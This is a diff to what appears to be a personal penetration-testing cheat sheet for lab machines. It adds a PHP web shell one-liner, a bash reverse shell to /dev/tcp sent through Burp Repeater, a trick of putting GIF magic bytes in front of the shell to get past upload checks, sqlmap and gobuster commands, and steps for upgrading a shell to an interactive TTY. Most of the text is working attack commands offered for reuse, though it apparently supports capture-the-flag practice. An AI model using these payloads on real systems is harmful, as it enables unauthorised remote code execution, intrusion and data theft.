@@ -22,6 +22,23 @@ Visual Studio Compiler
   - Paste *.cs code in top window and modify and callback IP and Ports
   - Select Properties for the file and select the correct .Net version
   - Build -> Build Solution
+  
+Burp
+  Cntrl+shift+r sends request to the repeter.
+  You can modify the request and select Go to try different requests.
+  On the repeater tab you can right click and change to a POST reqest instead of a GET.
+  
+PHP script
+  <?php system($_REQUEST['myvariable']); ?>
+  In Burp repeater you can change to a POST and add myvariable=whoami OR myvariable=bash -c 'bash -i >& /dev/tcp/myip/port 0>&1'
+  In Burp you can press Cntl+u to URL encode the POST request
+  
+Magic Bytes
+  Php script that looks like a GIF. The line before the <?php... you will put GIF8;
+  
+Burp and SQLMap
+  Using Burp copy the request. Right click on the request and select copy to file and name it whatever.req
+  sqlmap -r whatever.req --batch
 
 Msfconsole
   Vim meterpreter.rc
@@ -51,7 +68,7 @@ Wfuzz (Brute Force Web Usernames)
   wfuzz -c -w /usr/share/wfuzz/wordlist/webservices/ws-dirs.txt --hs "404" http://10.10.10.121/FUZZ
   
 Gobuster (Find website directories)
-  Gobuster -w /usr/share/wordlists/dirbuster/wordlist.txt -u http://10.10.10.85:3000 -o outputfile.log
+  Gobuster -w /usr/share/wordlists/dirbuster/wordlist.txt -u http://10.10.10.85:3000 -x html,php  -o outputfile.log -t 50
 
 Dirb (Find website directories)
   Dirb http://website/
@@ -118,6 +135,9 @@ FTP
 
 Python Bash Shell
   python -c 'import pty;pty.spawn("/bin/bash")'
+  Ctrl+z to background
+  stty raw -echo
+  fg+Enter and hit enter twice
 
 Phamton Evasion
 Veil
